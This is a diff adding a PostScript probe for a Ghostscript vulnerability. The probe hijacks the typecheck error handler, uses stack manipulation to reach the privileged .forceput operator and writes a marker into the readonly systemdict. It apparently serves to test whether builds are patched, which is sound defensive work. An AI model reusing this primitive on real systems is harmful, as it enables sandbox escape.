@@ -1,0 +1,35 @@
+%!PS
+% Ghostscript CVE-2026-125396 rung-1/2 probe.
+% A Type 1 font whose cleartext replaced the loader filename string with a
+% local array makes the bound .putgstringcopy raise typecheck in `copy`.
+% This errordict /typecheck handler performs the writeup's five-pop stack
+% surgery and resumes at the bound .forceput, writing a benign marker into
+% the readonly systemdict.  Vulnerable builds accept the write; the
+% 1484854e operand-type guard blocks it.
+/LoaderOriginalTypecheck errordict /typecheck get def
+errordict /typecheck {
+  userdict /LoaderTrapPhase known
+    { userdict /LoaderTrapPhase get } { false } ifelse
+  {
+    userdict /LoaderTrapPhase false put
+    pop pop pop pop pop
+    userdict /ForceTarget get
+    userdict /ForceKey get
+    userdict /ForceValue get
+  } { LoaderOriginalTypecheck } ifelse
+} bind put
+userdict /QUIET true put
+userdict /ForceTarget systemdict put
+userdict /ForceKey /GS_FORCEPUT_PROBE put
+userdict /ForceValue 999 put
+userdict /LoaderTrapPhase true put
+(GS_FONT_PATH) getenv
+{ /GSFontPath exch def }
+{ (ENV_MISSING) = quit }
+ifelse
+userdict /Fontmap 20 dict put
+userdict /Fontmap get /NimbusSans-Regular [ GSFontPath ] put
+{ /NimbusSans-Regular findfont pop } stopped pop
+(TRAP_FIRED=) print userdict /LoaderTrapPhase get not == flush
+(GS_FORCEPUT_RESULT=) print systemdict /GS_FORCEPUT_PROBE known == flush
+quit
